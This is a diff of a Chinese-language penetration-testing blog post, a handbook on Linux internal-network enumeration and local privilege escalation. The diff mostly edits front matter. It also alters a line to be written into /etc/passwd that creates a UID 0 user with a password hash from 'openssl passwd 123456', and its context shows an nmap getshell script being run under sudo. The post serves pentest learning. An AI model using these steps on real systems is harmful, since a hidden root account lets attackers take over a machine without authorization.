@@ -1,9 +1,12 @@
 ---
 title: Linux内网信息收集与本地提权全流程手册
-date: 2026-07-15 10:00:00 +0800
+date: 2026-07-15 12:00:00 +0800
 categories: [经验分享]
-tags: [Linux, 内网渗透, 提权, 信息收集]
+tags: [渗透测试, 提权, Linux]
+description: 本文为独立 Linux 内网渗透专项手册，涵盖系统信息收集、用户/环境/进程/日志枚举、密码爆破、SSH私钥挖掘、SUID提权、PATH环境变量劫持、Sudo提权、计划任务提权、内核漏洞、rbash逃逸、共享库注入、Capability权限提权全套实战命令，适配靶场及真实内网渗透场景。
 ---
+
+# Linux内网信息收集与本地提权全流程手册
 
 本文为独立 Linux 内网渗透专项手册，涵盖**系统信息收集、用户/环境/进程/日志枚举、密码爆破、SSH私钥挖掘、SUID提权、PATH环境变量劫持、Sudo提权、计划任务提权、内核漏洞、rbash逃逸、共享库注入、Capability权限提权**全套实战命令，适配靶场及真实内网渗透场景。
 
@@ -244,7 +247,7 @@ sudo nmap --script=getshell.nse
 openssl passwd 123456
 
 # 写入/etc/passwd 创建root权限用户
-ali:bwfgXppOVV0PI:0:0::/root:/bin/bash
+kali:bwfgXppOVV0PI:0:0::/root:/bin/bash
 ```
 
 #### 3\.7 Mv 命令劫持提权
